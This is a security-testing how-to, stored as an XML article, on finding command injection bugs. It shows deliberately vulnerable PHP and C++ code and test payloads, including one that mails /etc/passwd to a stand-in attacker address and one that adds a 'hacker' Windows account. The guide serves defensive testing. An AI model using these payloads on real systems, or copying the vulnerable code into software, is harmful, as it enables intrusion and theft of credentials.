@@ -1,0 +1,555 @@
+<?xml version="1.0"?>
+<TeamMentor_Article Metadata_Hash="1753848153" Content_Hash="-1017429221">
+  <Metadata>
+    <Id>67bcf4f1-e1e1-4dcd-ab64-9b5ddfa79976</Id>
+    <Id_History>441dc02d-a2e0-45a4-9c51-1f0f2e690ec3,</Id_History>
+    <Library_Id>ea854894-8e16-46c8-9c61-737ef46d7e82</Library_Id>
+    <Title>How to Test for Command Injection Bugs</Title>
+    <Category>Input and Data Validation</Category>
+    <Phase>Test</Phase>
+    <Technology> Any</Technology>
+    <Type>How To</Type>
+    <DirectLink />
+    <Tag />
+    <Security_Demand />
+    <Author>Andres De Vivanco</Author>
+    <Priority />
+    <Status />
+    <Source>SI</Source>
+  </Metadata>
+  <Content Sanitized="true" DataType="Html">
+    <Data><![CDATA[<p>
+    <span>
+    </span>
+  </p>
+  <h1>
+    <span>Applies to:</span>
+  </h1>
+  <ul>
+    <li>
+      <span>Programming languages that allow interaction with operating system commands such as C/C&#43;&#43;, Java, VB, PHP, Perl, and Python.</span>
+    </li>
+  </ul>
+  <p>
+    <span>&nbsp;</span>
+  </p>
+  <h1>
+    <span>Summary</span>
+  </h1>
+  <p>
+    <span>Command injection vulnerabilities are particularly dangerous as they allow unauthorized execution of operating system commands.<span>&nbsp; </span>They exist because applications fail to properly validate and sanitize the parameters they use when invoking shell functions such as </span>
+    <span>system()</span>
+    <span> or </span>
+    <span>exec()</span>
+    <span> to execute system commands.<span>&nbsp;&nbsp; </span>Attackers with control of these parameters can trick the application into executing any system command of their choice.<span>&nbsp; </span></span>
+  </p>
+  <p>
+    <span>For example, a UNIX application lists the contents of a folder using the </span>
+    <span>ls </span>
+    <span>command.<span>&nbsp; </span>It takes the string </span>
+    <i>
+      <span>folder_name</span>
+    </i>
+    <span> from the user and, without any validation, concatenates it to </span>
+    <span>"ls"</span>
+    <span> to build the actual command.<span>&nbsp; </span>The application then passes the command (</span>
+    <span>"ls <i>folder_name</i>") </span>
+    <span>to the</span>
+    <span> system()</span>
+    <span> function and grabs the results.<span>&nbsp; </span>A command injection bug allows an attacker to inject an additional command in the input string</span>
+    <i>
+      <span> folder_name</span>
+    </i>
+    <span>.<span>&nbsp; </span>As a result the application is tricked into executing the attacker&#8217;s additional command.</span>
+  </p>
+  <p>
+    <span>In order to properly test for command injection vulnerabilities, the following steps should be followed:</span>
+  </p>
+  <ul>
+    <li>
+      <span>Step 1:<span>&nbsp; </span>Understand Attack Scenarios</span>
+      <li>
+        <span>Step 2:<span>&nbsp; </span>Analyze Causes and Countermeasures</span>
+        <li>
+          <span>Step 3:<span>&nbsp; </span>Start Testing and Exploring</span>
+          <li>
+            <span>Step 4:<span>&nbsp; </span>Fine-tune Test Cases</span>
+          </li>
+        </li>
+      </li>
+    </li>
+  </ul>
+  <p>
+    <span>&nbsp;</span>
+  </p>
+  <h1>
+    <span>Step 1:<span>&nbsp; </span>Understand Attack Scenarios</span>
+  </h1>
+  <p>
+    <span>The first step in testing for command injection vulnerabilities is to understand their attack scenarios.<span>&nbsp; </span>There are two common types on command injection bugs:</span>
+  </p>
+  <ul>
+    <li>
+      <span>Direct command injection. </span>
+      <li>
+        <span>Indirect command injection.</span>
+      </li>
+    </li>
+  </ul>
+  <p>
+    <b>
+      <i>
+        <span>&nbsp;</span>
+      </i>
+    </b>
+  </p>
+  <h2>
+    <span>
+      <em>Scenario 1:<span>&nbsp; </span>Direct Command injection</em>
+    </span>
+  </h2>
+  <p>
+    <span>The most basic form of command injection consists of directly supplying the additional command to the vulnerable application.<span>&nbsp;&nbsp; </span>First the attacker discovers that the application invokes a system command by directly passing user supplied data as arguments to the command.<span>&nbsp;&nbsp;&nbsp; </span>Then the attacker supplies the malicious command as part of the expected arguments.<span>&nbsp; </span>The application executes the original command and then the malicious one. </span>
+  </p>
+  <p>
+    <span>In detail:</span>
+  </p>
+  <ol>
+    <li>
+      <span>Attacker discovers that application uses client input to execute a command.</span>
+      <li>
+        <span>Attacker supplies malicious command as part of the client input.</span>
+        <li>
+          <span>Attacker observes application executing additional command.</span>
+        </li>
+      </li>
+    </li>
+  </ol>
+  <p>
+    <span>&nbsp;</span>
+  </p>
+  <h2>
+    <span>
+      <em>Scenario 2:<span>&nbsp; </span>Indirect Command injection</em>
+    </span>
+  </h2>
+  <p>
+    <span>This case of command injection consists of indirectly supplying the additional command to the vulnerable application possibly through a file or an environment variable.<span>&nbsp;&nbsp;&nbsp;&nbsp; </span>First the attacker deducts that the application invokes a system command using data from an external source such as a file or an environment variable.<span>&nbsp; </span>The attacker then modifies the contents of the external source to add a malicious command.<span>&nbsp;&nbsp; </span>Then the attacker waits or forces the application to execute the malicious command along with the original one.</span>
+  </p>
+  <p>
+    <span>In detail:</span>
+  </p>
+  <ol>
+    <li>
+      <span>Attacker discovers that application uses data stored in an external source to execute a command.</span>
+      <li>
+        <span>Attacker edits the external source to include malicious command.</span>
+        <li>
+          <span>Attacker waits until the application executes the original command (or attacker attempts to bring the application to a state in which it will execute the command supplied).</span>
+          <li>
+            <span>Attacker verifies that the application executes the injected command.</span>
+          </li>
+        </li>
+      </li>
+    </li>
+  </ol>
+  <p>
+    <b>
+      <span>
+      </span>
+    </b>&nbsp;</p>
+  <h1>
+    <span>Step 2:<span>&nbsp; </span>Analyze Causes and Countermeasures</span>
+  </h1>
+  <p>
+    <span>During this step you will understand the cause of command injection bugs as well as common defenses.<span>&nbsp;&nbsp;&nbsp;&nbsp; </span>This will help you look for bugs in code and recognize safe coding practices.</span>
+  </p>
+  <p>
+    <span>&nbsp;</span>
+  </p>
+  <h2>
+    <span>
+      <em>Command Injection Causes</em>
+    </span>
+  </h2>
+  <p>
+    <span>There is one single cause for command injection bugs: poor input validation.<span>&nbsp; </span>Any application that builds command strings using non-sanitized data is vulnerable to this bug. .<span>&nbsp; </span>The following code snippets demonstrate command injection vulnerabilities. This PHP code running in Windows uses the input supplied by a text box in a form and invokes the </span>
+    <span>exec</span>
+    <span> function to </span>
+    <span>type</span>
+    <span> the file: </span>
+  </p>
+  <pre>
+    <span>&lt;?php<br />&nbsp;<br />&nbsp; &#36;command = 'type ' . &#36;_POST&#91;'username'&#93;;<br />&nbsp; exec(&#36;command, &#36;res);&nbsp; <br />&nbsp;<br />&nbsp; for (&#36;i = 0; &#36;i &lt; sizeof(&#36;res); &#36;i&#43;&#43;) <br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo &#36;res&#91;&#36;i&#93;.'&lt;br&gt;';<br />&nbsp;<br />?&gt;</span>
+    <span>&nbsp;</span>
+  </pre>
+  <p>
+    <span>A user can supply the following string to see the list of active connections in the server:</span>
+    <span>
+    </span>
+  </p>
+  <p>
+    <span>
+    </span>
+  </p>
+  <pre>
+    <span>file.txt&#124;netstat -ano</span>
+  </pre>
+  <p>
+    <span>
+    </span>
+  </p>
+  <p>
+    <span>The following example in C&#43;&#43; (courtesy of OWASP &#91;i&#93;) runs in a POSIX compliant environment such as a Unix variant.<span>&nbsp; </span>It uses input supplied by the command line to </span>
+    <span>system</span>
+    <span> and runs the</span>
+    <span> cat </span>
+    <span>command:</span>
+  </p>
+  <p>
+    <span>
+    </span>
+  </p>
+  <pre>
+    <span>#include &lt;stdio.h&gt;<br />#include &lt;unistd.h&gt;<br />&nbsp;<br />int main(int argc, char &#42;&#42;argv) &#123;<br />&nbsp;<br />&nbsp;char cat&#91;&#93; = "cat ";<br />&nbsp;char &#42;command;<br />&nbsp;size_t commandLength;<br />&nbsp;<br />&nbsp;commandLength = strlen(cat) &#43; strlen(argv&#91;1&#93;) &#43; 1;<br />&nbsp;command = (char &#42;) malloc(commandLength);<br />&nbsp;strncpy(command, cat, commandLength);<br />&nbsp;strncat(command, argv&#91;1&#93;, (commandLength - strlen(cat)) );<br />&nbsp;<br />&nbsp;system(command);<br />&nbsp;return (0);<br />&nbsp;<br />&#125;</span>
+  </pre>
+  <p>
+    <span>A user can supply the following string to list the contents of the see the contents of the server&#8217;s current directory:</span>
+  </p>
+  <pre>
+    <strong>
+      <span>file.txt;ls</span>
+      <span>
+      </span>
+    </strong>
+  </pre>
+  <p>
+    <span>The code snippets above use two different functions that interact with the shell named </span>
+    <span>exec()</span>
+    <span> and </span>
+    <span>system().<span>&nbsp; </span></span>
+    <span>The following list compiles popular functions attacked during command injection:</span>
+    <span>&nbsp;</span>
+  </p>
+  <table>
+    <tbody>
+      <tr>
+        <td>
+          <pre>
+            <span>
+              <strong>Function</strong>
+            </span>
+          </pre>
+        </td>
+        <td>
+          <pre>
+            <span>
+              <strong>Language</strong>
+            </span>
+          </pre>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          <pre>
+            <span>system, execlp,execvp, ShellExecute, _wsystem</span>
+          </pre>
+        </td>
+        <td>
+          <pre>
+            <span>C/C&#43;&#43;</span>
+          </pre>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          <pre>
+            <span>Runtime.exec</span>
+          </pre>
+        </td>
+        <td>
+          <pre>
+            <span>Java</span>
+          </pre>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          <pre>
+            <span>exec, eval</span>
+          </pre>
+        </td>
+        <td>
+          <pre>
+            <span>PHP</span>
+          </pre>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          <pre>
+            <span>exec, open, eval, </span>
+          </pre>
+        </td>
+        <td>
+          <pre>
+            <span>Perl</span>
+          </pre>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          <pre>
+            <span>exec, eval, execfile, input</span>
+          </pre>
+        </td>
+        <td>
+          <pre>
+            <span>Python</span>
+          </pre>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          <pre>
+            <span>Shell, ShellExecuteForExplore, ShellExecute</span>
+          </pre>
+        </td>
+        <td>
+          <pre>
+            <span>VB</span>
+          </pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+  <pre>
+    <span>&nbsp;</span>
+  </pre>
+  <h2>
+    <span>
+      <em>Command Injection Countermeasures</em>
+    </span>
+  </h2>
+  <p>
+    <span>Applications defend against command injection bugs by doing proper input validation and sanitization.<span>&nbsp;&nbsp; </span>Developers must look for all instances where the application invokes a shell-like system function such as </span>
+    <span>exec</span>
+    <span> or </span>
+    <span>system</span>
+    <span> and avoid executing them unless the parameters have been properly validated and sanitized.<span>&nbsp;&nbsp; </span>There are two possible ways to validate these parameters: using black lists or using white lists.<span>&nbsp; </span></span>
+  </p>
+  <p>
+    <span>Black lists check for malicious patterns before allowing execution.<span>&nbsp; </span>In case of command injection, a black list might contain command delimiters such as a semicolon (;)vertical dash (&#124;), double dash (&#124;&#124;), double amp (&&) as well as dangerous commands such as </span>
+    <span>rm, cp, cat, ls, at, net, netstat, del, copy</span>
+    <span>, etc.<span>&nbsp; </span>However, a major drawback impedes this countermeasure from being effective; unless the black list covers absolutely all dangerous possibilities, the adversary can find a variation outside of the black list to carry an attack.<span>&nbsp; </span><span>&nbsp;&nbsp;</span></span>
+  </p>
+  <p>
+    <span>White lists match against safe execution patterns.<span>&nbsp; </span>If the data in question doesn&#8217;t match any of the safe patterns it is disallowed.<span>&nbsp; </span>This solves the problem of new variations of dangerous constructs since any new (malicious) construct that doesn&#8217;t match a safe one is automatically blocked.<span>&nbsp; </span>A common way to implement white lists is to match the input against a regular expression that indicates the safe format for the command.<span>&nbsp; </span>However, regular expressions can be complex to write and interpret.<span>&nbsp; </span>Developers must make sure they understand well how to write and interpret regular expressions before implementing this defense.</span>
+  </p>
+  <p>
+    <span>&nbsp;</span>
+  </p>
+  <h1>
+    <span>Step 3:<span>&nbsp; </span>Start Testing and Exploring</span>
+  </h1>
+  <p>
+    <span>During this step you will start testing your application with basic command injection strings and observing how the application reacts.</span>
+  </p>
+  <h2>
+    <em>
+      <span>Start with a simple test string</span>
+      <span>
+      </span>
+    </em>
+  </h2>
+  <p>
+    <span>First, you need to find all the places where your application invokes a system command to perform and operation.<span>&nbsp; </span>Then on each of these places, start exploring how the application handles the basic characters needed for command injection.<span>&nbsp;&nbsp;&nbsp; </span>The following two strings are good to try as they contain both commands and command injection characters: </span>
+  </p>
+  <pre>
+    <span>abc;dir C:&#124;xyz&netstat<span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>(Windows)</span>
+  </pre>
+  <pre>
+    <span>abc;ls&#124;cp&rm<span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>(UNIX)</span>
+  </pre>
+  <p>
+    <span>If the application doesn&#8217;t give an error message because of the special characters then there is a chance that it suffers from a command injection bug.</span>
+  </p>
+  <p>
+    <span>&nbsp;</span>
+  </p>
+  <h2>
+    <em>
+      <span>Build a valid command</span>
+      <span>
+      </span>
+    </em>
+  </h2>
+  <p>
+    <span>It is important that you are able to comprehend.<span>&nbsp; </span>For example, a <i>file not found</i> error rather than an <i>invalid data format</i> error is a good hint that the application is processing the special characters as part of the file.<span>&nbsp; </span>For example, you might get a file not found error when using the following string:</span>
+  </p>
+  <pre>
+    <span>
+      <strong>file.txt&#124;dir c:</strong>
+    </span>
+    <span>
+    </span>
+  </pre>
+  <p>
+    <span>This is because the application is calling </span>
+    <span>exec()</span>
+    <span> with the following string:</span>
+  </p>
+  <pre>
+    <span>cmd /c type </span>
+    <span>"</span>
+    <span>c:\public_html\user_files\<span><strong>file.txt&#124;dir c:</strong></span></span>
+    <span>" </span>
+    <span>
+    </span>
+  </pre>
+  <p>
+    <span>For the input string to execute the directory listing command you need to close the double quotes before appending the extra command:</span>
+  </p>
+  <pre>
+    <span>file.txt</span>
+    <span>
+      <strong>"</strong>
+    </span>
+    <span>&#124;dir c:</span>
+  </pre>
+  <p>
+    <span>Pay extra attention to quotes and double quotes since omitting them can easily result in the injection string treated as data. </span>
+  </p>
+  <p>
+    <span>Sometimes the application doesn&#8217;t reflect the output of the injected command on screen. To get around this, use a command that doesn&#8217;t create screen output but that performs a visible action:</span>
+  </p>
+  <table>
+    <tbody>
+      <tr>
+        <td>
+          <pre>
+            <span>file.txt;mail attacker&#64;attacker.org &lt;/etc/passwd</span>
+          </pre>
+          <pre>
+            <span>&nbsp;</span>
+          </pre>
+        </td>
+        <td>
+          <pre>
+            <span>Emails attacker the server&#8217;s passwords.</span>
+          </pre>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          <pre>
+            <span>file.txt&#124;net user /add "</span>
+            <span>hacker</span>
+            <span>"</span>
+          </pre>
+          <pre>
+            <span>&nbsp;</span>
+          </pre>
+        </td>
+        <td>
+          <pre>
+            <span>Adds hacker to the Windows user database.</span>
+          </pre>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          <pre>
+            <span>file.txt;ping&#37;20attacker_site</span>
+          </pre>
+        </td>
+        <td>
+          <pre>
+            <span>Pings the attacker site.</span>
+          </pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+  <pre>
+    <span>&nbsp;</span>
+    <span>&nbsp;</span>
+  </pre>
+  <h1>
+    <span>Step 4:<span>&nbsp; </span>Fine-tune Test Case Data</span>
+  </h1>
+  <p>
+    <span>To thoroughly test your application against command injection bugs, you must cover all possible entry points and scenarios where command injection is possible.</span>
+  </p>
+  <h2>
+    <span>
+      <em>Try different entry points and scenarios</em>
+    </span>
+  </h2>
+  <p>
+    <span>Continue exploring the different entry points of the application.<span>&nbsp; </span>The format of the test case data will vary depending on the entry point.<span>&nbsp; </span>For example if you are testing through the URL the string </span>
+    <span>file.txt</span>
+    <span>"</span>
+    <span>&#124;dir c: </span>
+    <span>might look like one of the two below (depending on the URL encoding):</span>
+  </p>
+  <ul>
+    <li>
+      <pre>
+        <span>file.txt</span>
+        <span>"</span>
+        <span>&#124;dir&#37;20c: </span>
+      </pre>
+      <li>
+        <pre>
+          <span>file.txt</span>
+          <span>"</span>
+          <span>&#124;dir&#43;c:</span>
+          <span>&nbsp;</span>
+        </pre>
+      </li>
+    </li>
+  </ul>
+  <p>
+    <span>It is important that you consider different encodings and data format for additional command injection entry points such as: input fields, URL parameters, POST data, web service methods, user interface elements, environment variables, database contents, registry contents, file contents, third party APIs, and network packets.</span>
+  </p>
+  <p>
+    <span>When testing for indirect command injection it is important that you control the source of the parameters passed to the target function. <span>&nbsp;&nbsp;</span>For example, if you are attacking an application using </span>
+    <span>execfile </span>
+    <span>as the target function</span>
+    <span>
+    </span>
+    <span>then you must control the file passed to this function.<span>&nbsp; </span>Let&#8217;s say the application uses </span>
+    <span>execfile /private/commands.txt.</span>
+    <span> Here you don&#8217;t need to pass any malicious parameters; you must modify the commands file to inject malicious commands and wait for (or force) the injected command to execute. It is recommended that, when testing for indirect injection, you use an environment monitoring tool.<span>&nbsp;&nbsp; </span>You can use Sysinternals <i>Process Explorer</i> that now combines registry, file system, and environment variable monitoring to find out the external sources your application uses when invoking shell or system commands.</span>
+  </p>
+  <p>
+    <span>&nbsp;</span>
+  </p>
+  <h1>
+    <span>Conclusions</span>
+  </h1>
+  <p>
+    <span>Command injection bugs exist because of poor input validation and sanitization on the parameters used by functions that interact with the operating system shell.<span>&nbsp;&nbsp; </span>Any attacker with control of these parameters can force the application to execute unwanted system commands.<span>&nbsp; </span>Testing against command injection bugs consists of manipulating the original command parameters with different combinations of command injection strings that vary depending on the action to perform and the entry point under test.</span>
+  </p>
+  <p>
+    <span>&nbsp;</span>
+  </p>
+  <p>
+    <br />&nbsp;</p>
+  <p />
+  <hr />
+  <p />
+  <p>
+    <span>&#91;i&#93; <strong>Command Injection</strong>. OWASP. </span>
+    <a href="http://www.owasp.org/index.php/Command_Injection">
+      <span>http://www.owasp.org/index.php/Command_Injection</span>
+    </a>
+    <span>
+    </span>
+  </p>
+  <p>
+    <span>&nbsp;</span>
+  </p>]]></Data>
+  </Content>
+</TeamMentor_Article>
